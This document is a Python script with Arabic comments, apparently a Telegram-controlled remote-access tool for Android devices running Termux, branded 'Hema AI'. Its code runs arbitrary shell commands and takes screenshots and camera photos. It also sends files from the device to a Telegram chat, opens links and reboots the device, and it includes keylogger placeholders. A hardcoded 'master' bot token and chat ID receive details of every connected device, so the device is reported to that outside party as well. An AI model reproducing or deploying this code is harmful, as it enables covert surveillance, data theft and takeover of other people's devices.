import os
import threading
import telebot
from colorama import init, Fore, Style
import subprocess
import webbrowser
import psutil
import socket
import time

# تهيئة الألوان
init()

# البوت الأساسي
MASTER_TOKEN = "7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
MASTER_CHAT_ID = "5967116314"
master_bot = telebot.TeleBot(MASTER_TOKEN)

# البوت الثانوي
SECONDARY_TOKEN = "YOUR_BOT_TOKEN"  # استبدلها بتوكين البوت الخاص بك
SECONDARY_CHAT_ID = "YOUR_CHAT_ID"  # استبدلها بـ Chat ID الخاص بك
secondary_bot = telebot.TeleBot(SECONDARY_TOKEN)

# الشعار
LOGO = [
    "██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗",
    "██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║",
    "███████║█████╗  ██╔████╔██║███████║   ███████║██║",
    "██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║",
    "██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║",
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═╝"
]

DEVICE_NAME = socket.gethostname()
running_tasks = {}
connected_devices = {}

# عرض الشعار
def display_logo():
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    for i, line in enumerate(LOGO):
        print(colors[i % len(colors)] + line + Style.RESET_ALL)

# وظائف الأداة (معدلة لـ Termux)
def take_screenshot():
    # استخدام termux-api لالتقاط الشاشة
    os.system("termux-screenshot screen.png")
    with open("screen.png", "rb") as photo:
        secondary_bot.send_photo(SECONDARY_CHAT_ID, photo)

def start_camera():
    # استخدام termux-api لالتقاط صورة
    os.system("termux-camera-photo -c 0 camera.jpg")
    with open("camera.jpg", "rb") as photo:
        secondary_bot.send_photo(SECONDARY_CHAT_ID, photo)

def restart_device():
    os.system("reboot")  # تحتاج إلى صلاحيات root

def execute_shell(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    secondary_bot.send_message(SECONDARY_CHAT_ID, result.stdout or result.stderr or "تم التنفيذ")

def open_link(url):
    os.system(f"termux-open-url {url}")

def upload_file(file_path):
    # تحميل ملف من الجهاز إلى تيليجرام
    if os.path.exists(file_path):
        with open(file_path, "rb") as file:
            secondary_bot.send_document(SECONDARY_CHAT_ID, file)
    else:
        secondary_bot.send_message(SECONDARY_CHAT_ID, "الملف غير موجود.")

def play_file(file_path):
    # تشغيل ملف (صوت/فيديو) على الجهاز
    if os.path.exists(file_path):
        os.system(f"termux-open {file_path}")
    else:
        secondary_bot.send_message(SECONDARY_CHAT_ID, "الملف غير موجود.")

def start_keylogger():
    # تسجيل ضربات المفاتيح (محدود في Termux)
    secondary_bot.send_message(SECONDARY_CHAT_ID, "تسجيل المفاتيح غير مدعوم مباشرة في Termux حاليًا.")

def stop_keylogger():
    secondary_bot.send_message(SECONDARY_CHAT_ID, "لا يوجد تسجيل مفاتيح نشط.")

def get_device_info():
    info = {
        "Device": DEVICE_NAME,
        "OS": "Android",
        "CPU": psutil.cpu_percent(),
        "RAM": psutil.virtual_memory().percent
    }
    return info

# إعداد البوت الأساسي
@master_bot.message_handler(commands=['start'])
def master_welcome(message):
    if str(message.chat.id) == MASTER_CHAT_ID:
        master_bot.reply_to(message, "مرحبًا! البوت الأساسي جاهز.\nاستخدم /devices لعرض الأجهزة المتصلة.")

@master_bot.message_handler(commands=['devices'])
def list_devices(message):
    if str(message.chat.id) == MASTER_CHAT_ID:
        if connected_devices:
            response = "الأجهزة المتصلة:\n" + "\n".join([f"{i}: {name}" for i, name in enumerate(connected_devices.keys())])
            response += "\nاستخدم /control <رقم> للتحكم في جهاز."
            master_bot.reply_to(message, response)
        else:
            master_bot.reply_to(message, "لا توجد أجهزة متصلة.")

@master_bot.message_handler(commands=['control'])
def control_device(message):
    if str(message.chat.id) == MASTER_CHAT_ID:
        try:
            device_idx = int(message.text.split()[1])
            device_name = list(connected_devices.keys())[device_idx]
            master_bot.reply_to(message, f"تم اختيار {device_name}. أرسل الأوامر الآن.")
            connected_devices[device_name]["controlling"] = True
        except:
            master_bot.reply_to(message, "رقم غير صحيح. استخدم /devices لرؤية القائمة.")

@master_bot.message_handler(func=lambda message: True)
def forward_command(message):
    if str(message.chat.id) == MASTER_CHAT_ID:
        for device_name, info in connected_devices.items():
            if info.get("controlling"):
                secondary_bot.send_message(info["chat_id"], message.text)
                break

# إعداد البوت الثانوي
@secondary_bot.message_handler(commands=['start'])
def secondary_welcome(message):
    if str(message.chat.id) == SECONDARY_CHAT_ID:
        secondary_bot.reply_to(message, "مرحبًا! البوت الثانوي جاهز.")
        device_info = get_device_info()
        master_bot.send_message(MASTER_CHAT_ID, f"جهاز جديد متصل:\n{device_info}")
        connected_devices[DEVICE_NAME] = {"chat_id": SECONDARY_CHAT_ID, "controlling": False}

@secondary_bot.message_handler(func=lambda message: True)
def handle_commands(message):
    if str(message.chat.id) != SECONDARY_CHAT_ID:
        return
    cmd = message.text.split()[0]
    args = " ".join(message.text.split()[1:]) if len(message.text.split()) > 1 else ""
    
    commands = {
        "/screenshot": take_screenshot,
        "/start_camera": start_camera,
        "/restart": restart_device,
        "/shell": lambda: execute_shell(args),
        "/open_link": lambda: open_link(args),
        "/upload_file": lambda: upload_file(args),
        "/play_file": lambda: play_file(args),
        "/start_keylogger": start_keylogger,
        "/stop_keylogger": stop_keylogger,
    }
    if cmd in commands:
        threading.Thread(target=commands[cmd], daemon=True).start()

def start_bots():
    print(Fore.GREEN + "Hema AI يعمل الآن على Android..." + Style.RESET_ALL)
    threading.Thread(target=master_bot.polling, daemon=True).start()
    threading.Thread(target=secondary_bot.polling, daemon=True).start()

if __name__ == "__main__":
    display_logo()
    start_bots()
